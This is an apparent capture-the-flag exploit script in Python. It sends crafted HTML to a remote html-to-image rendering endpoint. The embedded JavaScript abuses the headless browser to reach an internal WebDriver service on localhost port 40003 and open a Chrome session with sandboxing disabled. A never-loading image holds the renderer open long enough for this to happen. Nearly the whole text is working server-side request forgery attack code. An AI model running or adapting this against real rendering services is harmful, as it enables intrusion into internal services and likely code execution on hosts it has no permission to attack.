import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name, timeout=90):
    s = requests.Session(); s.headers.update({'User-Agent':'Mozilla/5.0'})
    try:
        r = s.post(BASE+'/html-to-image', json={'pages':[html]}, timeout=timeout)
        if r.status_code==200 and 'zip' in r.headers.get('Content-Type',''):
            z=zipfile.ZipFile(io.BytesIO(r.content))
            for n in z.namelist():
                open(f'f:/mission-git-hackss/mission-git-hackss/{name}.jpg','wb').write(z.read(n))
                print(f'{name}: {len(z.read(n))} OK')
            return True
        print(f'{name}: [{r.status_code}] {r.text[:150]}'); return False
    except Exception as e:
        print(f'{name}: EXC {e}'); return False

# Phase 1: create session (async, keep a pending fetch alive so render waits ~12s)
# Use async so the render pipeline's network-idle wait gives Chrome time to spawn.
js = r'''<!doctype html><html><body style="font:14px monospace;white-space:pre-wrap;word-break:break-all"><div id=o>creating session...</div><script>
var out=document.getElementById('o');
var B="http://127.0.0.1:40003";
var caps=JSON.stringify({capabilities:{alwaysMatch:{browserName:"chrome","goog:chromeOptions":{args:["--headless=new","--no-sandbox","--disable-dev-shm-usage","--disable-gpu"]}}}});
// keep an image-based keepalive so screenshot waits
fetch(B+"/session",{method:"POST",headers:{"Content-Type":"application/json"},body:caps})
 .then(function(r){return r.text();})
 .then(function(t){out.textContent="RESP:"+t;})
 .catch(function(e){out.textContent="ERR:"+e;});
// block screenshot: create a never-loading image so renderer waits for timeout window
var im=document.createElement('img'); im.src="http://127.0.0.1:40003/session/keepalive-"+Date.now(); document.body.appendChild(im);
</script></body></html>'''
render(js, 'sess_create', timeout=120)
